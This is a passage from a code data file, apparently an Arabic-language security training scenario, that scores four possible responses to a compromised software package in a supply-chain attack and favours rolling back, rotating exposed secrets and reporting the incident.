      "✗ هذا لا ينفي الاختراق. اختراقات سلسلة التوريد غالبًا تحدث تحديدًا عبر حسابات ناشرين موثّقين تم اختراقها.",
    decisionQuestion: "ما هو الإجراء المناسب الآن؟",
    decisions: [
      {
        id: "rollback-rotate-report",
        label:
          "التراجع فورًا للإصدار الآمن السابق في كل البيئات، تدوير أي أسرار كانت متاحة أثناء نافذة الاختراق، وإبلاغ فريق الحزمة/السجل الرسمي",
        outcome:
          "قرار صحيح. التراجع يوقف تنفيذ الكود الخبيث فورًا، وتدوير الأسرار يمنع استغلال ما تعرّض له، والإبلاغ يحمي مستخدمين آخرين للحزمة نفسها.",
        points: 40,
      },
      {
        id: "update-hope-fixed",
        label: "تحديث الحزمة للإصدار التالي على أمل أن المشكلة عولجت",
        outcome:
          "قرار خطر. الاعتماد على إصدار مستقبلي غير مؤكد يترك بيئة الإنتاج الحالية مكشوفة، والأسرار المسرّبة تبقى صالحة للاستخدام.",
        points: 0,
      },
      {
        id: "disable-ci-only",
        label: "إيقاف خط أنابيب CI مؤقتًا دون معالجة البيئة الإنتاجية القائمة",
        outcome:
          "إجراء جزئي. إيقاف CI يمنع بناءات جديدة مصابة، لكن أي نظام إنتاجي بُني بالفعل بهذه الحزمة يبقى معرّضًا دون معالجة.",
        points: 15,
      },
      {
        id: "trust-reputation",
        label: "تجاهل التنبيه لأن الحزمة تحظى بآلاف التحميلات وسمعة جيدة",
        outcome:
          "قرار خاطئ. السمعة الجيدة والانتشار الواسع هما بالضبط ما يجعل حزمة مخترقة أداة فعّالة لهجمات سلسلة التوريد.",
        points: 5,
      },
    ],
  },
];